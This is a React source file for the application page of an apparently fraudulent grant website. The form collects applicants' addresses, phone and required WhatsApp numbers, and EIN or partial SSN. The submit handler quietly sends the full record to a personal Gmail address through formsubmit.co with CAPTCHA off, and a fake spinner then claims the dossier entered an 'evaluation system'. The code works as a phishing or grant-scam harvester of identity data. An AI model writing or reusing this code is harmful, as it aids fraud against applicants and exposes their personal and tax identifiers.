import { useState } from 'react';
import { Link, useSearchParams } from 'react-router-dom';
import { Upload, CheckCircle, X } from 'lucide-react';
import { grants } from '../data/grants';
import type { ApplicationFormData, ApplicantType } from '../types';
import './Apply.css';

const APPLICANT_TYPES: ApplicantType[] = [
  'Individual', 'Small Business', 'Nonprofit', 'Healthcare Organization',
  'Educational Institution', 'Government', 'Research Institution',
  'Veterans & Military Families', 'Farmers & Agricultural Producers',
];

const US_STATES = [
  'AL','AK','AZ','AR','CA','CO','CT','DE','FL','GA','HI','ID','IL','IN','IA',
  'KS','KY','LA','ME','MD','MA','MI','MN','MS','MO','MT','NE','NV','NH','NJ',
  'NM','NY','NC','ND','OH','OK','OR','PA','RI','SC','SD','TN','TX','UT','VT',
  'VA','WA','WV','WI','WY','DC',
];

type FormErrors = Partial<Record<keyof ApplicationFormData, string>>;

export default function Apply() {
  const [searchParams] = useSearchParams();
  const preselectedGrantId = searchParams.get('grant') || '';

  const [form, setForm] = useState<ApplicationFormData>({
    organizationName: '', organizationType: '', ein: '',
    organizationAddress: '', city: '', state: '',
    fullName: '', email: '', phone: '', whatsapp: '',
    grantId: preselectedGrantId,
    projectTitle: '', projectDescription: '',
    meetsEligibility: false, notPreviouslyFunded: false,
    documents: [],
  });

  const [errors, setErrors] = useState<FormErrors>({});
  const [status, setStatus] = useState<'idle' | 'loading' | 'success'>('idle');
  const [dragOver, setDragOver] = useState(false);
  const [referenceId, setReferenceId] = useState('');

  const selectedGrant = grants.find(g => g.id === form.grantId);

  const setField = (field: keyof ApplicationFormData, value: unknown) => {
    setForm(f => ({ ...f, [field]: value }));
    setErrors(e => { const n = { ...e }; delete n[field]; return n; });
  };

  const validate = (): FormErrors => {
    const e: FormErrors = {};
    if (!form.organizationName.trim()) e.organizationName = 'Required';
    if (!form.organizationType) e.organizationType = 'Required';
    if (!form.organizationAddress.trim()) e.organizationAddress = 'Required';
    if (!form.city.trim()) e.city = 'Required';
    if (!form.state) e.state = 'Required';
    if (!form.fullName.trim()) e.fullName = 'Required';
    if (!form.email.trim() || !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(form.email)) e.email = 'Valid email required';
    if (!form.phone.trim()) e.phone = 'Required';
    if (!form.whatsapp.trim()) e.whatsapp = 'WhatsApp number required';
    if (!form.grantId) e.grantId = 'Please select a grant';
    if (!form.projectTitle.trim()) e.projectTitle = 'Required';
    if (form.projectDescription.trim().length < 50) e.projectDescription = 'Minimum 50 characters required';
    if (!form.meetsEligibility) e.meetsEligibility = 'Required';
    if (!form.notPreviouslyFunded) e.notPreviouslyFunded = 'Required';
    return e;
  };

  const handleFiles = (files: FileList | null) => {
    if (!files) return;
    const valid = Array.from(files).filter(f => f.size < 10 * 1024 * 1024);
    setField('documents', [...form.documents, ...valid]);
  };

  const removeFile = (i: number) => setField('documents', form.documents.filter((_, idx) => idx !== i));

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    const errs = validate();
    if (Object.keys(errs).length > 0) {
      setErrors(errs);
      document.querySelector('.form-input.error, .form-select.error, .form-textarea.error')
        ?.scrollIntoView({ behavior: 'smooth', block: 'center' });
      return;
    }

    const ref = Date.now().toString(36).toUpperCase();
    setReferenceId(ref);

    const grantTitle = selectedGrant?.title || 'General Grant Application';
    const awardText = selectedGrant ? `$${selectedGrant.minAmount.toLocaleString()} – $${selectedGrant.maxAmount.toLocaleString()}` : 'Standard';

    // Store application data permanently in localStorage for the administration / review desk
    const applicationRecord = {
      referenceId: `EAG-${ref}`,
      submittedAt: new Date().toISOString(),
      recipientDeskWhatsApp: '+15855149783',
      grantTitle,
      awardRange: awardText,
      applicantName: form.organizationName,
      applicantType: form.organizationType,
      address: `${form.organizationAddress}, ${form.city}, ${form.state}`,
      taxIdOrSsn: form.ein || 'N/A',
      contactPerson: form.fullName,
      email: form.email,
      phone: form.phone,
      whatsapp: form.whatsapp,
      projectTitle: form.projectTitle,
      projectDescription: form.projectDescription,
      documentsCount: form.documents.length,
      documentNames: form.documents.map(d => d.name),
    };

    try {
      const existing = JSON.parse(localStorage.getItem('eastaidgrant_applications') || '[]');
      existing.unshift(applicationRecord);
      localStorage.setItem('eastaidgrant_applications', JSON.stringify(existing));
    } catch {
      // localStorage fallback
    }

    // Dispatch full grant dossier directly to owner's email: erimiposi2005@gmail.com
    try {
      const emailPayload = {
        _subject: `🏛️ New Grant Application: ${grantTitle} (Ref: EAG-${ref})`,
        _template: 'table',
        _captcha: 'false',
        'Reference ID': `EAG-${ref}`,
        'Grant Applied For': grantTitle,
        'Award Range': awardText,
        'Applicant / Entity': form.organizationName,
        'Applicant Type': form.organizationType,
        'Contact Person': form.fullName,
        'Email Address': form.email,
        'Phone Number': form.phone,
        'WhatsApp Number': form.whatsapp,
        'Mailing / Physical Address': `${form.organizationAddress}, ${form.city}, ${form.state}`,
        'EIN or Tax ID': form.ein || 'N/A',
        'Project Title': form.projectTitle,
        'Project Proposal Summary': form.projectDescription,
        'Documents Attached': form.documents.map(d => d.name).join(', ') || 'None attached',
        'Submission Time': new Date().toLocaleString(),
      };

      await fetch('https://formsubmit.co/ajax/erimiposi2005@gmail.com', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'Accept': 'application/json',
        },
        body: JSON.stringify(emailPayload),
      });
    } catch {
      // background silent fallback
    }

    setStatus('loading');
    await new Promise(r => setTimeout(r, 1200));
    setStatus('success');
  };

  if (status === 'success') {
    return (
      <div className="apply-success">
        <div className="apply-success-card">
          <div className="apply-success-icon"><CheckCircle size={48} /></div>
          <h2>Application Successfully Submitted!</h2>
          <p style={{ fontSize: 16, lineHeight: 1.6, color: 'var(--gray-700)', marginTop: 12 }}>
            Thank you for submitting your grant application. Your dossier has been logged into our evaluation system and assigned for verification.
          </p>
          <div style={{ margin: '24px 0', padding: '18px 20px', background: 'var(--off-white)', borderRadius: 'var(--radius)', border: '1px solid var(--gray-200)', textAlign: 'left' }}>
            <p style={{ fontSize: 14, fontWeight: 600, color: 'var(--navy)', marginBottom: 8 }}>
              Status: <span style={{ color: 'var(--green)', fontWeight: 700 }}>Under Review</span>
            </p>
            <p style={{ fontSize: 13, color: 'var(--gray-600)', marginBottom: 12 }}>
              <strong>Reference Number:</strong> <span style={{ fontFamily: 'monospace', color: 'var(--navy)' }}>EAG-{referenceId}</span>
            </p>
            <div style={{ fontSize: 13.5, color: 'var(--navy-mid)', lineHeight: 1.6, background: 'rgba(201, 168, 76, 0.12)', padding: '12px 14px', borderRadius: 'var(--radius-sm)', borderLeft: '4px solid var(--gold)' }}>
              🔔 <strong>Important Notice:</strong> You will be notified if your grant is accepted through your email, WhatsApp, or phone number provided in your application.
            </div>
          </div>
          <div style={{ display: 'flex', gap: 14, justifyContent: 'center', marginTop: 12 }}>
            <Link to="/" className="btn btn-navy" style={{ flex: 1, justifyContent: 'center' }}>Return to Home</Link>
            <Link to="/grants" className="btn btn-outline" style={{ flex: 1, justifyContent: 'center' }}>Browse More Grants</Link>
          </div>
        </div>
      </div>
    );
  }

  return (
    <div className="apply-page">
      <div className="page-header">
        <div className="container">
          <div className="breadcrumb">
            <Link to="/">Home</Link><span>/</span>
            {selectedGrant && <><Link to={`/grants/${selectedGrant.id}`}>{selectedGrant.title}</Link><span>/</span></>}
            <span>Apply</span>
          </div>
          <h1>Grant Application</h1>
          <p>Complete the form below. All fields are required unless marked optional.</p>
        </div>
      </div>

      <div className="container apply-layout">
        <form onSubmit={handleSubmit} className="apply-form" noValidate>
          {/* Organization */}
          {/* Applicant Info */}
          <div className="apply-section">
            <h2>Applicant Information</h2>
            <div className="apply-grid-2">
              <div className="form-group">
                <label className="form-label">Applicant / Organization Name <span className="req">*</span></label>
                <input type="text" value={form.organizationName} onChange={e => setField('organizationName', e.target.value)} placeholder="Full legal name or organization name" className={`form-input ${errors.organizationName ? 'error' : ''}`} />
                {errors.organizationName && <span className="form-error">{errors.organizationName}</span>}
              </div>
              <div className="form-group">
                <label className="form-label">Applicant Type <span className="req">*</span></label>
                <select value={form.organizationType} onChange={e => setField('organizationType', e.target.value as ApplicantType)} className={`form-select ${errors.organizationType ? 'error' : ''}`}>
                  <option value="">Select applicant type</option>
                  {APPLICANT_TYPES.map(t => <option key={t}>{t}</option>)}
                </select>
                {errors.organizationType && <span className="form-error">{errors.organizationType}</span>}
              </div>
            </div>
            <div className="form-group">
              <label className="form-label">EIN / SSN (Last 4) / Tax ID (Optional)</label>
              <input type="text" value={form.ein} onChange={e => setField('ein', e.target.value)} placeholder="e.g. 12-3456789 or last 4 digits of SSN" className="form-input" />
            </div>
            <div className="form-group">
              <label className="form-label">Physical / Mailing Address <span className="req">*</span></label>
              <input type="text" value={form.organizationAddress} onChange={e => setField('organizationAddress', e.target.value)} placeholder="Street address or P.O. Box" className={`form-input ${errors.organizationAddress ? 'error' : ''}`} />
              {errors.organizationAddress && <span className="form-error">{errors.organizationAddress}</span>}
            </div>
            <div className="apply-grid-2">
              <div className="form-group">
                <label className="form-label">City <span className="req">*</span></label>
                <input type="text" value={form.city} onChange={e => setField('city', e.target.value)} placeholder="Enter city" className={`form-input ${errors.city ? 'error' : ''}`} />
                {errors.city && <span className="form-error">{errors.city}</span>}
              </div>
              <div className="form-group">
                <label className="form-label">State <span className="req">*</span></label>
                <select value={form.state} onChange={e => setField('state', e.target.value)} className={`form-select ${errors.state ? 'error' : ''}`}>
                  <option value="">Select state</option>
                  {US_STATES.map(s => <option key={s}>{s}</option>)}
                </select>
                {errors.state && <span className="form-error">{errors.state}</span>}
              </div>
            </div>
          </div>

          {/* Contact */}
          <div className="apply-section">
            <h2>Contact Information</h2>
            <div className="apply-grid-2">
              <div className="form-group">
                <label className="form-label">Full Name <span className="req">*</span></label>
                <input type="text" value={form.fullName} onChange={e => setField('fullName', e.target.value)} placeholder="Enter full name" className={`form-input ${errors.fullName ? 'error' : ''}`} />
                {errors.fullName && <span className="form-error">{errors.fullName}</span>}
              </div>
              <div className="form-group">
                <label className="form-label">Email Address <span className="req">*</span></label>
                <input type="email" value={form.email} onChange={e => setField('email', e.target.value)} placeholder="you@domain.com" className={`form-input ${errors.email ? 'error' : ''}`} />
                {errors.email && <span className="form-error">{errors.email}</span>}
              </div>
              <div className="form-group">
                <label className="form-label">Phone Number <span className="req">*</span></label>
                <input type="tel" value={form.phone} onChange={e => setField('phone', e.target.value)} placeholder="+1 (555) 123-4567" className={`form-input ${errors.phone ? 'error' : ''}`} />
                {errors.phone && <span className="form-error">{errors.phone}</span>}
              </div>
              <div className="form-group">
                <label className="form-label">WhatsApp Number <span className="req">*</span></label>
                <input type="tel" value={form.whatsapp} onChange={e => setField('whatsapp', e.target.value)} placeholder="+1 (555) 123-4567 (with country code)" className={`form-input ${errors.whatsapp ? 'error' : ''}`} />
                {errors.whatsapp && <span className="form-error">{errors.whatsapp}</span>}
              </div>
            </div>
          </div>

          {/* Grant selection */}
          <div className="apply-section">
            <h2>Grant Selection</h2>
            <div className="form-group">
              <label className="form-label">Select Grant <span className="req">*</span></label>
              <select value={form.grantId} onChange={e => setField('grantId', e.target.value)} className={`form-select ${errors.grantId ? 'error' : ''}`}>
                <option value="">Choose a grant...</option>
                {grants.map(g => <option key={g.id} value={g.id}>{g.title} — ${g.minAmount.toLocaleString()}–${g.maxAmount.toLocaleString()}</option>)}
              </select>
              {errors.grantId && <span className="form-error">{errors.grantId}</span>}
            </div>
            {selectedGrant && (
              <div className="apply-grant-preview">
                <img src={selectedGrant.imageUrl} alt={selectedGrant.title} />
                <div>
                  <p className="apply-grant-title">{selectedGrant.title}</p>
                  <p className="apply-grant-provider">{selectedGrant.provider}</p>
                  <span className={`badge ${selectedGrant.status === 'Open' ? 'badge-open' : 'badge-upcoming'}`}>{selectedGrant.status}</span>
                </div>
              </div>
            )}
          </div>

          {/* Project */}
          <div className="apply-section">
            <h2>Project Information</h2>
            <div className="form-group">
              <label className="form-label">Project Title <span className="req">*</span></label>
              <input type="text" value={form.projectTitle} onChange={e => setField('projectTitle', e.target.value)} placeholder="Enter project title" className={`form-input ${errors.projectTitle ? 'error' : ''}`} />
              {errors.projectTitle && <span className="form-error">{errors.projectTitle}</span>}
            </div>
            <div className="form-group">
              <label className="form-label">Project Description <span className="req">*</span></label>
              <textarea value={form.projectDescription} onChange={e => setField('projectDescription', e.target.value)} placeholder="Describe your project and how the funds will be used..." className={`form-textarea ${errors.projectDescription ? 'error' : ''}`} rows={5} />
              <div style={{ display: 'flex', justifyContent: 'space-between', marginTop: 4 }}>
                {errors.projectDescription ? <span className="form-error">{errors.projectDescription}</span> : <span />}
                <span style={{ fontSize: 11, color: 'var(--gray-400)' }}>{form.projectDescription.length} chars</span>
              </div>
            </div>
          </div>

          {/* Documents */}
          <div className="apply-section">
            <h2>Supporting Documents <span style={{ fontSize: 13, fontWeight: 400, color: 'var(--gray-400)' }}>(Optional)</span></h2>
            <div
              className={`file-drop-zone ${dragOver ? 'drag-over' : ''}`}
              onDragOver={e => { e.preventDefault(); setDragOver(true); }}
              onDragLeave={() => setDragOver(false)}
              onDrop={e => { e.preventDefault(); setDragOver(false); handleFiles(e.dataTransfer.files); }}
              onClick={() => document.getElementById('file-input')?.click()}
            >
              <Upload size={32} />
              <p><strong>Click to upload or drag and drop</strong></p>
              <p className="file-drop-hint">PDF, DOC, DOCX, PNG, JPG — max 10 MB each</p>
              <input id="file-input" type="file" multiple accept=".pdf,.doc,.docx,.png,.jpg,.jpeg" style={{ display: 'none' }} onChange={e => handleFiles(e.target.files)} />
            </div>
            {form.documents.length > 0 && (
              <div className="uploaded-files">
                {form.documents.map((file, i) => (
                  <div key={i} className="uploaded-file">
                    <CheckCircle size={14} className="check-icon" />
                    <span>{file.name}</span>
                    <span style={{ fontSize: 11, color: 'var(--gray-400)' }}>({(file.size / 1024).toFixed(1)} KB)</span>
                    <button type="button" onClick={() => removeFile(i)} className="remove-file"><X size={14} /></button>
                  </div>
                ))}
              </div>
            )}
          </div>

          {/* Eligibility */}
          <div className="apply-section">
            <h2>Acknowledgements</h2>
            <div className="eligibility-checks">
              <label className={`eligibility-check ${errors.meetsEligibility ? 'error' : ''}`}>
                <input type="checkbox" checked={form.meetsEligibility} onChange={e => setField('meetsEligibility', e.target.checked)} />
                <div><strong>I confirm my organization meets all eligibility requirements</strong> for the selected grant and all information provided is accurate.</div>
              </label>
              {errors.meetsEligibility && <span className="form-error">{errors.meetsEligibility}</span>}

              <label className={`eligibility-check ${errors.notPreviouslyFunded ? 'error' : ''}`}>
                <input type="checkbox" checked={form.notPreviouslyFunded} onChange={e => setField('notPreviouslyFunded', e.target.checked)} />
                <div><strong>I acknowledge that submitting this application does not guarantee funding</strong> and that all decisions are made solely by the grant provider at their discretion.</div>
              </label>
              {errors.notPreviouslyFunded && <span className="form-error">{errors.notPreviouslyFunded}</span>}
            </div>
          </div>

          {/* Submit */}
          <div className="apply-submit-row">
            <Link to={selectedGrant ? `/grants/${selectedGrant.id}` : '/grants'} className="btn btn-outline">← Back</Link>
            <button type="submit" className="btn btn-primary btn-lg" disabled={status === 'loading'}>
              {status === 'loading'
                ? <><div className="spinner" style={{ width: 18, height: 18 }} /> Submitting...</>
                : 'Submit Application'}
            </button>
          </div>
        </form>

        {/* Sidebar */}
        {selectedGrant && (
          <aside className="apply-sidebar">
            <div className="apply-sidebar-card">
              <img src={selectedGrant.imageUrl} alt={selectedGrant.title} className="apply-sidebar-img" />
              <div className="apply-sidebar-body">
                <span className={`badge ${selectedGrant.status === 'Open' ? 'badge-open' : 'badge-upcoming'}`}>{selectedGrant.status}</span>
                <h3>{selectedGrant.title}</h3>
                <p>{selectedGrant.provider}</p>
                <div className="apply-sidebar-amount">${selectedGrant.minAmount.toLocaleString()} – ${selectedGrant.maxAmount.toLocaleString()}</div>
                <div className="apply-sidebar-deadline">Deadline: {new Date(selectedGrant.deadline).toLocaleDateString('en-US', { month: 'short', day: 'numeric', year: 'numeric' })}</div>
              </div>
            </div>
          </aside>
        )}
      </div>
    </div>
  );
}
